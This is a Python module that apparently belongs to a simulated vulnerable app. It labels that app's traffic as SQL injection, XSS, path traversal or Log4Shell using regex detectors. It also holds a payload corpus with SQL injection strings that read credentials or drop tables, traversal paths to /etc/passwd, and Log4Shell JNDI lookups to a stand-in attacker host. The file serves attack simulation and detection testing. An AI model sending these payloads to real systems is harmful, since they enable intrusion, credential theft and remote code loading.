"""Payload classification used by the vulnerable app to label its own traffic.

Note: this only sets a ground-truth `attack_class` on emitted events for realism.
The Log Evaluator does NOT trust these labels — it runs its own independent
detection over the raw fields.
"""
from __future__ import annotations

import re

SQLI = re.compile(r"('|%27)|(\b(union|select|drop|insert|or\s+1=1)\b)|(;--)|(--\s)", re.I)
XSS = re.compile(r"(<script|onerror=|<img|javascript:)", re.I)
TRAVERSAL = re.compile(r"(\.\./|\.\.%2f|%2e%2e|/etc/passwd|\.%2e)", re.I)
LOG4SHELL = re.compile(r"\$\{jndi:(ldap|rmi|dns)", re.I)

# attack payload corpus used by the simulator
SQLI_QUERIES = [
    "1' OR '1'='1", "%27 UNION SELECT username,password FROM users--",
    "1;DROP TABLE users;--", "admin'--",
]
TRAVERSAL_FILES = [
    "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
]
LOG4SHELL_UAS = [
    "${jndi:ldap://attacker.evil/a}",
    "${jndi:rmi://10.10.10.5/Exploit}",
]


def classify(*, path: str = "", user_agent: str = "") -> str | None:
    text = f"{path} {user_agent}"
    if LOG4SHELL.search(text):
        return "log4shell"
    if TRAVERSAL.search(path):
        return "path_traversal"
    if SQLI.search(path):
        return "sql_injection"
    if XSS.search(path):
        return "xss"
    return None
